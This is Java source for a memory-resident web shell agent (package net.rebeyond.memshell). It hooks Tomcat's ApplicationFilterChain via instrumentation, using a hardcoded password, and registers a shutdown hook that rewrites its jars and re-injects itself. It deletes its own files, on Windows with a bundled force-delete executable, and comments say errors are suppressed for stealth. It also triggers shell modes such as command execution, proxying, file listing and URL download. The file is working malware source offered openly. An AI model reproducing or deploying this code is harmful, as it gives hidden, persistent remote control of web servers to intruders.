package net.rebeyond.memshell;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.Arrays;
import java.util.Set;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.Query;

public class Agent {
	public static String className = "org.apache.catalina.core.ApplicationFilterChain";
	public static byte[] injectFileBytes = new byte[] {}, agentFileBytes = new byte[] {};
	public static String currentPath;
	public static String password = "rebeyond";

	public static void agentmain(String agentArgs, Instrumentation inst) {
		inst.addTransformer(new Transformer(), true);
		if (agentArgs.indexOf("^") >= 0) {
			Agent.currentPath = agentArgs.split("\\^")[0];
			Agent.password = agentArgs.split("\\^")[1];
		} else {
			Agent.currentPath = agentArgs;
		}
		System.out.println("Agent Main Done");
		Class[] loadedClasses = inst.getAllLoadedClasses();
		for (Class c : loadedClasses) {
			if (c.getName().equals(className)) {
				try {
					inst.retransformClasses(c);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

		try {
			initLoad();
			readInjectFile(Agent.currentPath);
			readAgentFile(Agent.currentPath);
			clear(Agent.currentPath);
		} catch (Exception e) {
			// 为了隐蔽,不要打印异常信息
		}
		Agent.persist();
	}

	public static void persist() {
		try {
			Thread t = new Thread() {
				public void run() {
					try {
						writeFiles("inject.jar", Agent.injectFileBytes);
						writeFiles("agent.jar", Agent.agentFileBytes);
						startInject();
					} catch (Exception e) {

					}
				}
			};
			t.setName("shutdown Thread");
			Runtime.getRuntime().addShutdownHook(t);
		} catch (Throwable t) {

		}
	}

	public static void writeFiles(String fileName, byte[] data) throws Exception {
		String tempFolder = System.getProperty("java.io.tmpdir");
		FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
		fso.write(data);
		fso.close();
	}

	public static void readInjectFile(String filePath) throws Exception {
		String fileName = "inject.jar";
		File f = new File(filePath + File.separator + fileName);
		if (!f.exists()) {
			f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
		}
		InputStream is = new FileInputStream(f);
		byte[] bytes = new byte[1024 * 100];
		int num = 0;
		while ((num = is.read(bytes)) != -1) {
			injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
		}
		is.close();
	}

	public static void readAgentFile(String filePath) throws Exception {
		String fileName = "agent.jar";
		File f = new File(filePath + File.separator + fileName);
		if (!f.exists()) {
			f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
		}
		InputStream is = new FileInputStream(f);
		byte[] bytes = new byte[1024 * 100];
		int num = 0;
		while ((num = is.read(bytes)) != -1) {
			agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
		}
		is.close();
	}

	public static void startInject() throws Exception {
		Thread.sleep(2000);
		String tempFolder = System.getProperty("java.io.tmpdir");
		String cmd = "java -jar " + tempFolder + File.separator + "inject.jar " + Agent.password;
		Runtime.getRuntime().exec(cmd);
	}

	public static void main(String[] args) {
		try {
			readAgentFile("e:/");
			String tempPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();

			String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath().substring(0,
					tempPath.lastIndexOf("/"));
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	static byte[] mergeByteArray(byte[]... byteArray) {
		int totalLength = 0;
		for (int i = 0; i < byteArray.length; i++) {
			if (byteArray[i] == null) {
				continue;
			}
			totalLength += byteArray[i].length;
		}

		byte[] result = new byte[totalLength];
		int cur = 0;
		for (int i = 0; i < byteArray.length; i++) {
			if (byteArray[i] == null) {
				continue;
			}
			System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
			cur += byteArray[i].length;
		}

		return result;
	}

	public static void clear(String currentPath) throws Exception {
		Thread clearThread = new Thread() {
			String currentPath = Agent.currentPath;

			public void run() {
				try {
					Thread.sleep(5000);
					String injectFile = currentPath + "inject.jar";
					String agentFile = currentPath + "agent.jar";
					new File(injectFile).getCanonicalFile().delete();
					String OS = System.getProperty("os.name").toLowerCase();
					if (OS.indexOf("windows") >= 0) {
						try {
							unlockFile(currentPath);
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					new File(agentFile).delete();
				} catch (Exception e) {
					//pass
				}
			}
		};
		clearThread.start();

	}

	public static void unlockFile(String currentPath) throws Exception {
		String exePath = currentPath + "foreceDelete.exe";
		InputStream is = Agent.class.getClassLoader().getResourceAsStream("other/forcedelete.exe");
		FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
		byte[] bytes = new byte[1024 * 100];
		int num = 0;
		while ((num = is.read(bytes)) != -1) {
			fos.write(bytes, 0, num);
			fos.flush();
		}
		fos.close();
		is.close();
		Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
		try {
			process.waitFor();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		new File(exePath).delete();
	}

	public static String getCurrentPid() {
		RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
		return runtimeMXBean.getName().split("@")[0];
	}

	public static void initLoad() throws Exception {
		try {
			MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
			Set<ObjectName> objectNames = beanServer.queryNames(new ObjectName("*:type=Connector,*"),
					Query.match(Query.attr("protocol"), Query.value("HTTP/1.1")));
			//String host = InetAddress.getLocalHost().getHostAddress();
			String host = "127.0.0.1";
			String port = objectNames.iterator().next().getKeyProperty("port");
			String url = "http" + "://" + host + ":" + port;
			String[] models = new String[] { "model=exec&cmd=whoami", "model=proxy", "model=chopper", "model=list&path=.",
					"model=urldownload&url=https://www.baidu.com/robots.txt&path=not_exist:/not_exist" };
			for (String model : models) {
				String address = url + "/robots.txt?" + "pass_the_world=" + Agent.password + "&" + model;
				openUrl(address);
			}
		}
		catch(Exception e)
		{
			//pass
		}
	}

	public static void openUrl(String address) throws Exception {
		URL url = new URL(address);
		HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
		urlcon.connect(); // 获取连接
		InputStream is = urlcon.getInputStream();
		BufferedReader buffer = new BufferedReader(new InputStreamReader(is));
		StringBuffer bs = new StringBuffer();
		String l = null;
		while ((l = buffer.readLine()) != null) {
			bs.append(l).append("\n");
		}
	}
}
